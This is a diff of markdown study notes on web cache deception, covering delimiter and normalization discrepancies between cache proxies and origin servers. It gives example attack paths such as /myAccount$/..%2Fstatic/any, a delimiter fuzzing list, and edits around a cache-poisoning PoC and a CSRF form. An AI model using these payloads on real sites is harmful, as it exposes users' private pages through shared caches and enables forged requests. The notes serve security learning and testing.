@@ -6,10 +6,10 @@
 
 # URL discrepancies 
 ## Delimiters
-Spring : Semicolon (;)
-Rails : Dot (.)
-OpenLiteSpeed : Null encoded byte (%00)
-Nginx : New encoded byte (%0a)
+Spring           ;         Semicolon
+Rails            .         Dot
+OpenLiteSpeed    %00       Null encoded byte
+Nginx            %0a       New encoded byte
 
 # Terminology
 Origin Server : The server that serves the content AKA Backend server
@@ -21,9 +21,9 @@ Delimiter     : A character or string that separates the path from the query str
 1. Identify a non-cacheable request 
 In that case we hope that what is appended is ignored by the frontend server and makes it to the backend  server.
 2. Send the same request appending a random suffix at the end of the path 
-> abc / ? # % ;
+> abc / ? # % ; %2F %00 %0a %09 %20
 3. Send the same request appending a delimiter before the random suffix at the end of the path 
-> abc / ? # % ;
+> abc / ? # % ; %2F %00 %0a %09 %20
 If the messages are identical, the character or string is used as a delimiter.
 Use Burp Intruder 
 # & URL delimiters in the real world 
@@ -71,10 +71,10 @@ to modify the behavior of the cache rules and obtain crafted keys.
 # Detecting dot-segment normalization
 To detect normalization in the origin server, issue a non-cacheable request (or a request with a
 cache buster) to a known path, then send the same message with a path traversal sequence:
-GET /home/index?cacheBuster
-GET /aaa/../home/index?cacheBuster or 
-GET /aaa%2F..%2Fhome/index?cacheBuster or 
-GET /aaa\..\home/index?cacheBuster
+> GET /home/index?cacheBuster
+> GET /aaa/../home/index?cacheBuster or 
+> GET /aaa%2F..%2Fhome/index?cacheBuster or 
+> GET /aaa\..\home/index?cacheBuster
 
 # Normalization discrepancies
 The following tables illustrate how different HTTP servers and web cache proxies normalize the
@@ -92,8 +92,8 @@ https://developers.cloudflare.com/cache/concepts/default-cache-behavior/#default
 Proxy sees and pays attention to a.css
 Server sees and ignores a.css
 Cache Proxy                 Origin Server
-/myAccount$a.css            /myAccount$a.css
-/myAccount%23a.css          /myAccount#a.css 
+> /myAccount$a.css            /myAccount$a.css
+> /myAccount%23a.css          /myAccount#a.css 
 
 Sometimes the Cache Proxy/LB/Frontend Server decodes before forwarding to the origin server
 Load Balancer:              /myAccount%25%32%33a.css 
@@ -104,6 +104,7 @@ If you are sending # in the browser, you need to encode it. Browsers don't send 
 # Static directories
 Eg: Where to find them
 Tip: Cache your browser network tap for which files are cached.
+```
 /static
 /assets
 /wp-content
@@ -111,18 +112,19 @@ Tip: Cache your browser network tap for which files are cached.
 /templates
 /public
 /shared
+```
 
 # Exploiting static directories with delimiters
 If a char is used as a delimiter by the Origin Server but not by the cache server and the 
 cache server normalizes the path before applying a static directory rule, 
 you can hide a path traversal segment after the delimiter, which the cache will resolve:
 
-GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
+> GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
 CP normalizes req, applying the path traversal so it sees /static/any 
 Origin Server uses $ as delimiter so it ignores $/..%2Fstatic/any and serves /myAccount
 CP applying static directory rules caches /myAccount as /static/any 
 Browser                        Cache Proxy      Origin Server
-/myAccount$/..%2Fstatic/any    /static/any      /myAccount
+> /myAccount$/..%2Fstatic/any    /static/any      /myAccount
 
 Remember to test, the behavior of the CP 
 
@@ -150,14 +152,14 @@ Use the technique used in static directories where
 the CP normalizes the req and there is a delimiter at backend. 
 The static directory is replaced by the filename and a cache buster
 
-GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_File>
+> GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_File>
 Browser                         Cache Proxy     Origin Server
-/myAccount/..%2Frobots.txt      /robots.txt     /myAccount
+> /myAccount/..%2Frobots.txt      /robots.txt     /myAccount
 
 # Understanding Our Cache and the Web Cache Deception Attack
 https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/
 Web cache deception lab delimiter list
-
+```
 !
 "
 #
@@ -287,7 +289,7 @@ XLSX
 
 # LYST Web Cache Poisoning POC Script 
 https://hackerone.com/reports/631589
-`
+
 <html>
   <head> </head>
   <body>
@@ -322,7 +324,7 @@ https://hackerone.com/reports/631589
     </script>
   </body>
 </html>
-`
+
 
 https://zhero-web-sec.github.io/cache-deception-to-csrf/
 Web Cache Deceptionce to CSRF form 
@@ -347,3 +349,4 @@ Web Cache Deceptionce to CSRF form
         document.getElementById('csrf').submit()
     </script>
 </html>
+```
